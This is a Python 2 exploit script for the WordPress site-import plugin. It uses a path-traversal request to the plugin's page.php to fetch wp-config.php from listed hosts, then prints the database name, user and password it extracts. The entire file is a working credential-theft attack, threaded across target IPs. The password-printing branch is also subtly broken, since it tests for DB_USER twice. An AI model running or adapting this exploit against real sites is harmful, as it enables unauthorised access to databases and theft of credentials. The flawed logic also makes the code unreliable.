import requests
import threading
import re
requests.adapters.DEFAULT_RETRIES = 5



WP_SITEIMPORT = '/wp-content/plugins/site-import/admin/page.php?url='
WP_CONFIG = '../../../../wp-config.php'
WP_HTTP = 'http://'
WP_REG_DB = "'(DB_\w+)'\s*,\s*'([^']+)'"
WP_REG_DB_NAME = 'DB_NAME'
WP_REG_DB_USR = 'DB_USER'
WP_REG_DB_PWD = 'DB_PASSWORD'
WP_PORT = ':8022'
ipList = {'192.168.0.116'}
threads = []

def printMysqlPwd(ip_port):
    payload = WP_HTTP + ip_port + WP_SITEIMPORT + WP_CONFIG
#    print payload
    try :
        r = requests.get(payload,timeout=30)
        r.encoding = 'utf-8'
        text = r.text
#        print text
        pattern = re.compile(WP_REG_DB)
        print 'ip--'+ ip_port + '\'s info is: '
        for m in re.finditer(pattern,text):
#            print m.group()
            if  WP_REG_DB_NAME == m.group(1):
                print 'DB_NAME : ' + m.group(2)
                continue
            elif WP_REG_DB_USR == m.group(1):
                print 'DB_USER : ' + m.group(2)
                continue
            elif WP_REG_DB_USR == m.group(1):
                print 'DB_PASSWORD : ' + m.group(2)
    except :
        err = payload + " ****error!****"
        print err
def testRE():
    str_1 = "define('DB_HOST','127.0.0.1');"
    print str_1
    pattern = re.compile(WP_REG_DB)
    match = pattern.search(str_1)
    if match:
        print match.group()+'---'+match.group(1)+'---'+match.group(2)
for ip in ipList:
    t = threading.Thread(target=printMysqlPwd,args=(ip+WP_PORT,))
    threads.append(t)

if __name__ == '__main__':
    for t in threads:
        t.start()